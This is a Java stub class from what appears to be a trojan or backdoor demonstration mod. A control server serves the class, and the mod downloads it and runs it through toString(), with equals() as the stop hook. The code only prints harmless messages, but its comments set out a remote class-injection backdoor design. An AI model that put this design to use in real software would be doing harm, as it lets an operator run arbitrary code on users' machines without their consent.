package com.lanceg.trojanmod.backdoor;

/**
 * This class is served by the Trojan Control Server to demonstrate class injection. The Trojan Mod will download this class from the server and call {@link #toString()}
 * to start it. When a the control server switches to a different payload, the mod will call {@link #equals(Object)} to clean up any extra resources.
 * 
 * @author Joe Desmond
 */
public class ArbitraryTestClass {
	
	/**
	 * toString() is used to bootstrap the payload. From here, the injected class can spawn new threads and do other malicious things.
	 * 
	 * @return can return anything, it doesn't matter
	 */
	@Override
	public String toString() {
		System.out.println("Some arbitrary code has just been executed.");
		
		return super.toString();
	}
	
	/**
	 * equals() is used to stop the payload. This is where threads and other resources can be cleaned up.
	 * 
	 * @param other can be anything
	 * @return can return anything
	 */
	@Override
	public boolean equals(Object other) {
		System.out.println("Thank you for letting me mine some bitcoin.");
		
		return super.equals(other);
	}

	public static final void main(final String[] args) {
		// stub - required to compile
	}
}
